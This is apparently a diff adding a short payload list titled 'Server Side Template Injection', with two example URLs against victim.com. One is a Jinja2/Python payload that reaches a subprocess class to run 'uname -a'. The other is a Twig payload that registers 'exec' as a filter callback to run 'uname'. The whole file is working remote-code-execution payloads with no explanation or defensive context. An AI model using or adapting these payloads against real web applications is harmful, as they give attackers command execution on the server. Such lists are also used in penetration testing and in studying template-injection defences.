@@ -1,0 +1,5 @@
+Server Side Template Injection 01 eg:
+
+http://victim.com/{{''.__class__.mro()[2].__subclasses__()[233](['uname','-a'])}}
+
+http://victim.com/{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
